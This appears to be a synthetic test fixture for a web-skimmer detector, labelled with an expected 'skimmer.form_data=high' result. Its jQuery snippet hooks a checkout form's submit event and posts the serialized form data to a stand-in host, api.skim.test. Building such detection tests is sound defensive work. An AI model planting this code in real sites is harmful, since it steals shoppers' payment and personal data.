// Synthetic test fixture: not functional malware. Hosts use the reserved .test TLD.
// context: script_host=cdn.vendor.test site=shop.example.test
// expect: skimmer.form_data=high
jQuery(function ($) {
  $("form#checkout").on("submit", function () {
    $.ajax({ type: "POST", url: "https://api.skim.test/collect", data: $(this).serialize() });
  });
});
